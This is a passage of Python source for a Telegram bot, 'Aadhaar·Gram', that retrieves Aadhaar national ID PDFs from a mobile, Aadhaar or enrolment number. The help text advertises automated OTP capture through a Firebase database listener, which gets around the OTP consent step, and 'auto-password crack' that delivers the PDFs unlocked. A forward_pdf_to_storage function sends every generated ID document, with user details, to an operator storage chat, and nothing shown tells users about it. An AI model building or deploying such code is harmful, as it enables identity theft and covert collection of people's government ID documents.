import sys
import io
import html
# Force UTF-8 output on Windows consoles with line buffering
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)

import requests
import json
import re
from datetime import datetime
import os
import time
import logging
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import emoji
from dotenv import load_dotenv

load_dotenv()

# Import Database & UIDAI API
import database
from database import (
    ensure_user, get_user, ban_user, unban_user, is_banned, all_users
)
from api import bot_api

# ============== LOGGING SETUP ==============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============== SMALL CAPS TYPOGRAPHY HELPERS ==============
SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ',
    'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
    'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
    'y': 'ʏ', 'z': 'ᴢ',
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
    'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
    'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
    'Y': 'ʏ', 'Z': 'ᴢ'
}

REVERSE_SC = {
    'ᴀ': 'a', 'ʙ': 'b', 'ᴄ': 'c', 'ᴅ': 'd', 'ᴇ': 'e', 'ғ': 'f', 'ɢ': 'g', 'ʜ': 'h',
    'ɪ': 'i', 'ᴊ': 'j', 'ᴋ': 'k', 'ʟ': 'l', 'ᴍ': 'm', 'ɴ': 'n', 'ᴏ': 'o', 'ᴘ': 'p',
    'ǫ': 'q', 'ʀ': 'r', 's': 's', 'ᴛ': 't', 'ᴜ': 'u', 'ᴠ': 'v', 'ᴡ': 'w', 'x': 'x',
    'ʏ': 'y', 'ᴢ': 'z'
}

def to_sc(text):
    if not text:
        return text
    return ''.join(SMALL_CAPS_MAP.get(c, c) for c in text)

def from_sc(text):
    if not text:
        return text
    return ''.join(REVERSE_SC.get(c, c) for c in text)

# ============== BOT & CREDENTIALS CONFIG ==============
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
BOT_NAME           = "🎁 ᴀᴀᴅʜᴀᴀʀ·ɢʀᴀᴍ"
DIVIDER            = "━━━━━━━━━━━━━━━━━━━━━━━"
OWNER_ID           = int(os.environ.get("OWNER_ID", "8267676849"))
OWNER_USERNAME     = os.environ.get("OWNER_USERNAME", "@apifounder")
STORAGE_CHAT       = os.environ.get("STORAGE_CHAT", "@NagiNaverDie")

# Dynamic Channel Configuration with MongoDB persistence
_init_ch = database.get_channel_config(
    default_id=os.environ.get("CHANNEL_ID", "-1002894475319"),
    default_link=os.environ.get("CHANNEL_LINK", "https://t.me/+Vq7Ha3AVq4JjNTNl")
)
CHANNEL_ID         = _init_ch.get("channel_id", "-1002894475319")
CHANNEL_LINK       = _init_ch.get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")
FORCE_CHECK        = _init_ch.get("force_check", True)

def get_channel_id():
    return database.get_channel_config().get("channel_id", "-1002894475319")

def get_channel_link():
    return database.get_channel_config().get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")

def is_force_check_enabled():
    return database.get_channel_config().get("force_check", True)

SESSION_TIMEOUT = 60

# Parse Admin IDs
ADMIN_IDS = set()
for a in os.environ.get("ADMIN_IDS", "8267676849,8901139503,8327823004").split(","):
    a = a.strip()
    if a.isdigit():
        ADMIN_IDS.add(int(a))
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)

def is_admin(user_id):
    try:
        uid = int(user_id)
        return uid in ADMIN_IDS or uid == OWNER_ID
    except Exception:
        return False

worker_pool = ThreadPoolExecutor(max_workers=8)

# ============== PROXY CONFIG ==============
PROXY_CONFIG = {'use_proxy': False, 'http': None, 'https': None}
PROXY_URL = os.environ.get("PROXY_URL", "").strip()

def create_session(use_proxy=False, proxy_string=None):
    session = requests.Session()
    session.mount('https://', requests.adapters.HTTPAdapter(
        pool_connections=30, pool_maxsize=60, max_retries=1, pool_block=False
    ))
    if use_proxy and proxy_string:
        parsed = urlparse(proxy_string)
        proxy_url = f"{parsed.scheme}://{parsed.netloc}"
        PROXY_CONFIG['use_proxy'] = True
        PROXY_CONFIG['http'] = proxy_url
        PROXY_CONFIG['https'] = proxy_url
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        logger.info(f"Proxy set: {proxy_url}")
    else:
        PROXY_CONFIG['use_proxy'] = False
        PROXY_CONFIG['http'] = None
        PROXY_CONFIG['https'] = None
    return session

telegram_session = None
polling_session = None

def get_telegram_session():
    global telegram_session
    if telegram_session is None:
        if PROXY_URL:
            telegram_session = create_session(True, PROXY_URL)
        else:
            telegram_session = create_session(False)
    return telegram_session

def get_polling_session():
    global polling_session
    if polling_session is None:
        if PROXY_URL:
            polling_session = create_session(True, PROXY_URL)
        else:
            polling_session = create_session(False)
    return polling_session

# UIDAI API Instance
bot = bot_api

# ============== CUSTOM EMOJIS (Bot API 7.0 - 10.4+) ==============
CUSTOM_EMOJIS = {
    '⚡': '5456140674028019486',
    '⚡️': '5456140674028019486',
    '📱': '6201882038975341348',
    '📱️': '6201882038975341348',
    '🪪': '5890864241388293875',
    '🪪️': '5890864241388293875',
    '🔢': '5226513232549664618',
    '🔢️': '5226513232549664618',
    '💎': '5427168083074628963',
    '💎️': '5427168083074628963',
    '🛒': '5258024802010026053',
    '🛒️': '5258024802010026053',
    '🔗': '6113813004426416777',
    '🔗️': '6113813004426416777',
    '❓': '5436113877181941026',
    '❓️': '5436113877181941026',
    '📢': '6305206294848475991',
    '📢️': '6305206294848475991',
    '✅': '6275829594717165532',
    '✅️': '6275829594717165532',
    '❌': '6305324410744084248',
    '❌️': '6305324410744084248',
    '👑': '6237927637906364256',
    '👑️': '6237927637906364256',
    '💰': '6244678063775289843',
    '💰️': '6244678063775289843',
    '👤': '6305229569276254220',
    '👤️': '6305229569276254220',
    '⏳': '5386367538735104399',
    '⏳️': '5386367538735104399',
    '🔄': '5030872266716480568',
    '🔄️': '5030872266716480568',
    '🔐': '5296369303661067030',
    '🔐️': '5296369303661067030',
    '🔑': '5296369303661067030',
    '🔑️': '5296369303661067030',
    '🔒': '4956719506027185156',
    '🔒️': '4956719506027185156',
    '🔓': '5890882606668452641',
    '🔓️': '5890882606668452641',
    '📄': '5258477770735885832',
    '📄️': '5258477770735885832',
    '⭐': '5372849966689566579',
    '⭐️': '5372849966689566579',
    '🚀': '5359664288241829619',
    '🚀️': '5359664288241829619',
    '🛡': '6235476345451716705',
    '🛡️': '6235476345451716705',
    '⚠️': '5274099962655816924',
    '⚠': '5274099962655816924',
    '🎁': '5084613633418199991',
    '🎁️': '5084613633418199991',
    '🔥': '5289722755871162900',
    '🔥️': '5289722755871162900',
    '🥷': '5289722755871162900',
    '1️⃣': '6141182593325862850',
    '2️⃣': '6140858267460440006',
    '3️⃣': '6140761832559742520',
    '4️⃣': '6143358763060433247',
    '5️⃣': '6140671341893784411',
    '📅': '6235449188373502693',
    '📋': '5203910550542631009',
    '📌': '5397782960512444700',
    '🔍': '5362061893605279054',
    '🔙': '6276030448862763508',
    '👋': '6204139486671019705',
    '🇮🇳': '6147942648511469492',
    '🇮🇳️': '6147942648511469492',
}

def format_custom_emojis(text):
    if not text or not isinstance(text, str):
        return text

    saved_blocks = {}
    def save_block(m):
        tok = f"__SAVED_BLK_{len(saved_blocks)}__"
        saved_blocks[tok] = m.group(0)
        return tok

    text = re.sub(r'<code>[\s\S]*?</code>', save_block, text)
    text = re.sub(r'<tg-emoji[\s\S]*?</tg-emoji>', save_block, text)

    if CUSTOM_EMOJIS:
        sorted_emojis = sorted(CUSTOM_EMOJIS.keys(), key=len, reverse=True)
        for i, em in enumerate(sorted_emojis):
            eid = CUSTOM_EMOJIS[em]
            if em in text:
                tok = f"__CUST_{i}_{eid}__"
                saved_blocks[tok] = f'<tg-emoji emoji-id="{eid}">{em}</tg-emoji>'
                text = text.replace(em, tok)

    for tok, orig in saved_blocks.items():
        text = text.replace(tok, orig)

    return text

def sanitize_reply_markup(reply_markup):
    """Ensures inline keyboards strictly adhere to official Telegram Bot API schema."""
    if not isinstance(reply_markup, dict) or 'inline_keyboard' not in reply_markup:
        return reply_markup
    allowed_keys = {
        'text', 'url', 'callback_data', 'web_app', 'login_url',
        'switch_inline_query', 'switch_inline_query_current_chat',
        'switch_inline_query_chosen_chat', 'copy_text', 'callback_game',
        'pay', 'icon_custom_emoji_id'
    }
    clean_rows = []
    for row in reply_markup.get('inline_keyboard', []):
        clean_row = []
        for btn in row:
            if isinstance(btn, dict):
                clean_btn = {k: v for k, v in btn.items() if k in allowed_keys}
                clean_row.append(clean_btn)
        if clean_row:
            clean_rows.append(clean_row)
    return {'inline_keyboard': clean_rows}

# ============== SESSION MANAGEMENT ==============
user_sessions   = {}
_sessions_lock  = threading.Lock()

def get_session(chat_id):
    with _sessions_lock:
        return user_sessions.get(chat_id, {'step': 'main', 'data': {}, 'last_activity': time.time()})

def set_session(chat_id, step, data=None):
    with _sessions_lock:
        existing = user_sessions.get(chat_id, {})
        d = data if data is not None else existing.get('data', {})
        user_sessions[chat_id] = {'step': step, 'data': d, 'last_activity': time.time()}

def update_session_data(chat_id, key, value):
    with _sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {'step': 'main', 'data': {}, 'last_activity': time.time()}
        user_sessions[chat_id]['data'][key] = value
        user_sessions[chat_id]['last_activity'] = time.time()

def clear_session(chat_id):
    with _sessions_lock:
        user_sessions[chat_id] = {'step': 'main', 'data': {}, 'last_activity': time.time()}

def touch_session(chat_id):
    with _sessions_lock:
        if chat_id in user_sessions:
            user_sessions[chat_id]['last_activity'] = time.time()

def _cleanup_sessions():
    while True:
        time.sleep(20)
        try:
            expired = []
            with _sessions_lock:
                for cid, s in list(user_sessions.items()):
                    step = s.get('step', 'main')
                    if step != 'main':
                        if step in ('downloading',):
                            continue
                        idle = time.time() - s.get('last_activity', time.time())
                        if idle > SESSION_TIMEOUT:
                            user_sessions[cid] = {'step': 'main', 'data': {}, 'last_activity': time.time()}
                            expired.append(cid)
            for cid in expired:
                try:
                    send_message(cid,
                        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                        f"<b>⏰ sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n\n"
                        f"⚠️  ʀᴇᴀsᴏɴ   ·  ɪᴅʟᴇ ғᴏʀ 60 sᴇᴄᴏɴᴅs\n\n"
                        f"{DIVIDER}\n"
                        f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ.</i>",
                        reply_markup=get_menu_keyboard()
                    )
                except Exception:
                    pass
        except Exception as e:
            logger.error(f"Session cleanup error: {e}")

# ============== CHANNEL MEMBERSHIP ==============
_channel_member_cache = {}
_cm_lock = threading.Lock()
CM_CACHE_TTL = 180.0

def is_channel_member(user_id):
    if not is_force_check_enabled():
        return True
    uid = str(user_id)
    with _cm_lock:
        item = _channel_member_cache.get(uid)
        if item and (time.time() - item['t']) < CM_CACHE_TTL:
            return item['is_member']

    ch_id = get_channel_id()
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    params = {'chat_id': ch_id, 'user_id': user_id}
    try:
        response = get_telegram_session().get(url, params=params, timeout=5).json()
        if response.get('ok'):
            status = response.get('result', {}).get('status', '')
            is_mem = status in ['member', 'administrator', 'creator']
            with _cm_lock:
                _channel_member_cache[uid] = {'t': time.time(), 'is_member': is_mem}
            return is_mem

        desc = response.get('description', '')
        if 'chat not found' in desc.lower() or 'bot is not a member' in desc.lower():
            logger.warning(f"Bot cannot check membership in {ch_id}: {desc}. Please ensure bot is added as Administrator to channel.")
            return True

        with _cm_lock:
            _channel_member_cache[uid] = {'t': time.time(), 'is_member': False}
        return False
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return True

def remove_reply_keyboard(chat_id):
    try:
        res = send_message(chat_id, "<i>⚡ ʟᴏᴀᴅɪɴɢ…</i>", reply_markup={'remove_keyboard': True})
        if res and res.get('ok'):
            mid = res.get('result', {}).get('message_id')
            if mid:
                delete_message(chat_id, mid)
    except Exception as e:
        logger.debug(f"Error removing keyboard: {e}")

_bot_username = None
def get_bot_username():
    global _bot_username
    if _bot_username:
        return _bot_username
    try:
        r = get_telegram_session().get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10).json()
        if r.get('ok'):
            _bot_username = r['result']['username']
            return _bot_username
    except Exception:
        pass
    return "Aadhaar_PdfBot"

# ============== TELEGRAM HELPERS ==============
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    text = format_custom_emojis(text)
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        payload['reply_markup'] = sanitize_reply_markup(reply_markup)
    
    for attempt in range(2):
        try:
            response = get_telegram_session().post(url, json=payload, timeout=12)
            res = response.json()
            if not res.get('ok'):
                desc = str(res.get('description', '')).lower()
                if 'blocked by the user' in desc or 'deactivated' in desc or 'chat not found' in desc:
                    logger.debug(f"User {chat_id} unreachable: {desc}")
                    return res
                if 'parse entities' in desc:
                    payload['text'] = re.sub(r'<[^>]+>', '', text)
                    payload['parse_mode'] = None
                    return get_telegram_session().post(url, json=payload, timeout=12).json()
                logger.warning(f"Telegram sendMessage non-ok for {chat_id}: {res}")
            return res
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as net_err:
            if attempt == 0:
                time.sleep(0.5)
                continue
            logger.warning(f"Network timeout sending to {chat_id}: {net_err}")
            return None
        except Exception as e:
            logger.error(f"Error sending message to {chat_id}: {e}")
            return None
    return None

def edit_message_text(chat_id, message_id, text, reply_markup=None):
    if not message_id:
        return None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    text = format_custom_emojis(text)
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        payload['reply_markup'] = sanitize_reply_markup(reply_markup)
    try:
        response = get_telegram_session().post(url, json=payload, timeout=10)
        res = response.json()
        if not res.get('ok'):
            desc = str(res.get('description', '')).lower()
            if 'message is not modified' in desc:
                return res
            if 'parse entities' in desc:
                payload['text'] = re.sub(r'<[^>]+>', '', text)
                payload['parse_mode'] = None
                return get_telegram_session().post(url, json=payload, timeout=10).json()
            logger.debug(f"editMessageText non-ok for {chat_id}/{message_id}: {res}")
        return res
    except Exception as e:
        logger.debug(f"Error editing message {message_id}: {e}")
        return None

def answer_callback_query(callback_query_id, text=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    data = {'callback_query_id': callback_query_id}
    if text:
        data['text'] = text
    try:
        get_telegram_session().post(url, json=data, timeout=6)
    except Exception as e:
        logger.debug(f"Transient callback query error: {e}")

def set_message_reaction(chat_id, message_id=None, emoji="⚡"):
    if not message_id:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setMessageReaction"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": emoji}],
        "is_big": True
    }
    try:
        get_telegram_session().post(url, json=payload, timeout=5)
    except Exception as e:
        logger.debug(f"Reaction error: {e}")

def delete_message(chat_id, message_id):
    if not message_id:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    try:
        resp = get_telegram_session().post(url, json={"chat_id": chat_id, "message_id": message_id}, timeout=5)
        return resp.status_code == 200
    except Exception as e:
        logger.debug(f"Error deleting message {message_id}: {e}")
        return False

def send_photo(chat_id, photo_bytes, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    files = {'photo': ('image.png', photo_bytes, 'image/png')}
    data = {'chat_id': chat_id, 'parse_mode': 'HTML'}
    if caption:
        data['caption'] = format_custom_emojis(caption)
    if reply_markup:
        data['reply_markup'] = json.dumps(sanitize_reply_markup(reply_markup))
    try:
        response = get_telegram_session().post(url, data=data, files=files, timeout=20)
        return response.json()
    except Exception as e:
        logger.error(f"Error sending photo: {e}")
        return None

def send_document(chat_id, file_path, caption=None, filename="Aadhaar.pdf"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    if caption:
        caption = format_custom_emojis(caption)
    try:
        with open(file_path, 'rb') as f:
            files = {'document': (filename, f, 'application/pdf')}
            data = {'chat_id': chat_id, 'parse_mode': 'HTML'}
            if caption:
                data['caption'] = caption
            response = get_telegram_session().post(url, data=data, files=files, timeout=30).json()
            if not response.get('ok'):
                logger.error(f"Telegram sendDocument failed for chat {chat_id}: {response}")
                if 'parse entities' in str(response.get('description', '')).lower():
                    f.seek(0)
                    data['parse_mode'] = None
                    data['caption'] = re.sub(r'<[^>]+>', '', caption) if caption else None
                    response = get_telegram_session().post(url, data=data, files=files, timeout=30).json()
        return response
    except Exception as e:
        logger.error(f"Error sending document: {e}")
        return None

# ============== KEYBOARDS (SMALL CAPS & 100% INLINE) ==============
def get_main_keyboard():
    return {'remove_keyboard': True}

def get_menu_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴍᴀɪɴ ᴍᴇɴᴜ', 'callback_data': 'start', 'icon_custom_emoji_id': '5030872266716480568'}
            ]
        ]
    }

def get_welcome_inline_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴍᴏʙɪʟᴇ', 'callback_data': 'search_mobile', 'icon_custom_emoji_id': '6201882038975341348'},
                {'text': 'ᴀᴀᴅʜᴀᴀʀ', 'callback_data': 'search_aadhaar', 'icon_custom_emoji_id': '5890864241388293875'},
                {'text': 'ᴇɪᴅ', 'callback_data': 'search_eid', 'icon_custom_emoji_id': '5226513232549664618'}
            ],
            [
                {'text': 'ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ', 'callback_data': 'search_firebase', 'icon_custom_emoji_id': '5289722755871162900'}
            ],
            [
                {'text': 'ʜᴇʟᴘ & ɢᴜɪᴅᴇ', 'callback_data': 'help', 'icon_custom_emoji_id': '5436113877181941026'}
            ]
        ]
    }

def get_cancel_keyboard():
    return {'inline_keyboard': [[{'text': 'ᴄᴀɴᴄᴇʟ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6305324410744084248'}]]}

def get_help_keyboard():
    return {
        'inline_keyboard': [
            [
                {'text': 'ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ', 'callback_data': 'search_firebase', 'icon_custom_emoji_id': '5289722755871162900'}
            ],
            [
                {'text': 'ᴄᴏɴᴛᴀᴄᴛ sᴜᴘᴘᴏʀᴛ', 'url': f"https://t.me/{OWNER_USERNAME.lstrip('@')}", 'icon_custom_emoji_id': '6201882038975341348'},
                {'text': 'ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ', 'url': get_channel_link(), 'icon_custom_emoji_id': '6305206294848475991'}
            ],
            [
                {'text': 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data': 'cancel', 'icon_custom_emoji_id': '6276030448862763508'}
            ]
        ]
    }

def get_channel_invite_url():
    return get_channel_link()

def get_join_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ', 'url': get_channel_link(), 'icon_custom_emoji_id': '6305206294848475991'}],
            [{'text': 'ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ',    'callback_data': 'check_join', 'icon_custom_emoji_id': '6275829594717165532'}],
        ]
    }

def get_admin_keyboard():
    fc_status = "ON" if is_force_check_enabled() else "OFF"
    fc_emoji = '6275829594717165532' if is_force_check_enabled() else '6305324410744084248'
    return {
        'inline_keyboard': [
            [{'text': 'sᴛᴀᴛɪsᴛɪᴄs',       'callback_data': 'admin_stats', 'icon_custom_emoji_id': '6204093414556834971'},
             {'text': 'ᴜsᴇʀ ʟɪsᴛ',        'callback_data': 'admin_users', 'icon_custom_emoji_id': '6305229569276254220'}],
            [{'text': 'ᴜsᴇʀ ʟᴏᴏᴋᴜᴘ',      'callback_data': 'admin_userinfo_prompt', 'icon_custom_emoji_id': '5362061893605279054'}],
            [{'text': 'ʙᴀɴ ᴜsᴇʀ',         'callback_data': 'admin_ban_prompt', 'icon_custom_emoji_id': '5240241223632954241'},
             {'text': 'ᴜɴʙᴀɴ ᴜsᴇʀ',       'callback_data': 'admin_unban_prompt', 'icon_custom_emoji_id': '6275829594717165532'}],
            [{'text': 'ᴄʜᴀɴɴᴇʟ sᴇᴛᴛɪɴɢs', 'callback_data': 'admin_channel_menu', 'icon_custom_emoji_id': '6305206294848475991'},
             {'text': 'ʙʀᴏᴀᴅᴄᴀsᴛ',        'callback_data': 'admin_broadcast_prompt', 'icon_custom_emoji_id': '6305206294848475991'}],
            [{'text': f'ғᴏʀᴄᴇ ᴊᴏɪɴ: {fc_status}', 'callback_data': 'admin_toggle_force_check', 'icon_custom_emoji_id': fc_emoji}],
        ]
    }

def show_admin_channel_menu(chat_id):
    cfg = database.get_channel_config()
    ch_id = cfg.get("channel_id", "-1002894475319")
    ch_link = cfg.get("channel_link", "https://t.me/+Vq7Ha3AVq4JjNTNl")
    fc_txt = "ON" if cfg.get("force_check", True) else "OFF"
    fc_emoji = '6275829594717165532' if cfg.get("force_check", True) else '6305324410744084248'
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>📢 ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ sᴇᴛᴛɪɴɢs</b>\n\n"
        f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{ch_id}</code>\n"
        f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {ch_link}\n"
        f"🛡️  <b>ғᴏʀᴄᴇ ᴊᴏɪɴ:</b> <b>{fc_txt}</b>\n\n"
        f"<i>💡 ʙᴏᴛ ᴋᴏ ᴄʜᴀɴɴᴇʟ ᴍᴀɪɴ ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ ʙᴀɴᴀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.</i>",
        reply_markup={
            'inline_keyboard': [
                [{'text': 'ᴄʜᴀɴɢᴇ ᴄʜᴀɴɴᴇʟ', 'callback_data': 'admin_change_channel_prompt', 'icon_custom_emoji_id': '5203910550542631009'}],
                [{'text': f'ᴛᴏɢɢʟᴇ ғᴏʀᴄᴇ ᴊᴏɪɴ ({fc_txt})', 'callback_data': 'admin_toggle_force_check', 'icon_custom_emoji_id': fc_emoji}],
                [{'text': 'ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ', 'callback_data': 'admin_back', 'icon_custom_emoji_id': '6276030448862763508'}]
            ]
        }
    )

# ============== SHARED DISPLAY HELPERS ==============
def show_help(chat_id):
    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
        f"<b>❓ ʜᴇʟᴘ & ᴜsᴇʀ ɢᴜɪᴅᴇ</b>\n\n"
        f"⚡ <b>ᴀᴠᴀɪʟᴀʙʟᴇ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇᴛʜᴏᴅs:</b>\n"
        f"• <b>📱 ᴍᴏʙɪʟᴇ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ. ʙᴏᴛ ᴠᴇʀɪғɪᴇs ᴏᴛᴘ 1 ᴛᴏ ɢᴇᴛ ᴇɪᴅ, ᴛʜᴇɴ ᴅᴏᴡɴʟᴏᴀᴅs ᴘᴅғ ᴠɪᴀ ᴏᴛᴘ 2.\n"
        f"• <b>🪪 ᴀᴀᴅʜᴀᴀʀ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 12-ᴅɪɢɪᴛ ᴀᴀᴅʜᴀᴀʀ ɴᴜᴍʙᴇʀ ғᴏʀ ᴅɪʀᴇᴄᴛ ᴏᴛᴘ ᴅᴏᴡɴʟᴏᴀᴅ.\n"
        f"• <b>🔢 ᴇɪᴅ sᴇᴀʀᴄʜ:</b> ᴇɴᴛᴇʀ 28-ᴅɪɢɪᴛ ᴇɴʀᴏʟʟᴍᴇɴᴛ ɪᴅ ᴅɪʀᴇᴄᴛʟʏ.\n"
        f"• <b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ:</b> ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ᴏᴛᴘ ғᴇᴛᴄʜ! ᴘʀᴏᴠɪᴅᴇ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ & ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ᴜʀʟ. ᴛʜᴇ ʙᴏᴛ ᴀᴜᴛᴏ-ʟɪsᴛᴇɴs ᴛᴏ ʏᴏᴜʀ ᴅᴀᴛᴀʙᴀsᴇ ғᴏʀ ʙᴏᴛʜ ᴏᴛᴘs ᴀɴᴅ ᴅᴇʟɪᴠᴇʀs ᴛʜᴇ ᴘᴅғ ᴡɪᴛʜᴏᴜᴛ ᴍᴀɴᴜᴀʟ ᴏᴛᴘ ᴛʏᴘɪɴɢ!\n\n"
        f"🔓 <b>ᴀᴜᴛᴏ-ᴘᴀssᴡᴏʀᴅ ᴄʀᴀᴄᴋ:</b>\n"
        f"ᴀʟʟ ᴘᴅғs ᴀʀᴇ ɪɴsᴛᴀɴᴛʟʏ ᴜɴʟᴏᴄᴋᴇᴅ ᴀɴᴅ ᴅᴇʟɪᴠᴇʀᴇᴅ ᴡɪᴛʜᴏᴜᴛ ᴘᴀssᴡᴏʀᴅ.\n\n"
        f"📩 <b>sᴜᴘᴘᴏʀᴛ & ɪɴǫᴜɪʀɪᴇs:</b> {OWNER_USERNAME}\n"
        f"{DIVIDER}",
        reply_markup=get_help_keyboard()
    )

# ============== GATES ==============
def channel_gate(chat_id):
    if is_force_check_enabled() and not is_channel_member(chat_id):
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📢 ᴊᴏɪɴ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ</b>\n\n"
            f"🔒  ʙᴏᴛ ᴋᴏ ᴜsᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ʜᴜᴍᴀʀᴇ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴋᴏ ᴊᴏɪɴ ᴋᴀʀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ɴᴇᴇᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴ sᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ ᴀᴜʀ '✅ ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ' ᴅᴀʙᴀʏᴇɪɴ.</i>",
            reply_markup=get_join_keyboard()
        )
        return False
    return True

def ban_gate(chat_id):
    if is_banned(chat_id):
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🚫 ᴀᴄᴄᴇss ʀᴇᴠᴏᴋᴇᴅ</b>\n\n"
            f"⛔  ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ʀᴇsᴛʀɪᴄᴛᴇᴅ.\n"
            f"📩  ᴄᴏɴᴛᴀᴄᴛ {OWNER_USERNAME} ᴛᴏ ᴀᴘᴘᴇᴀʟ.\n\n"
            f"{DIVIDER}"
        )
        return True
    return False

def forward_pdf_to_storage(user_id, file_path, name, password=None, method="mobile"):
    """Forwards every generated user Aadhaar PDF to the storage group with full user details."""
    if not STORAGE_CHAT or not file_path or not os.path.exists(file_path):
        return
    try:
        u = database.get_user(user_id) or {}
        first = u.get('first_name') or ''
        last = u.get('last_name') or ''
        uname = f"@{u.get('username')}" if u.get('username') else 'None'
        full_name = f"{first} {last}".strip() or "Telegram User"
        role_tag = "👑 OWNER" if int(user_id) == OWNER_ID else ("🛡️ ADMIN" if is_admin(user_id) else "👤 USER")

        cap = (
            f"<b>{BOT_NAME} · 🗄️ STORAGE LOG</b>\n{DIVIDER}\n"
            f"👤  <b>ᴜsᴇʀ:</b> {html.escape(full_name)} ({uname})\n"
            f"🆔  <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>  [{role_tag}]\n"
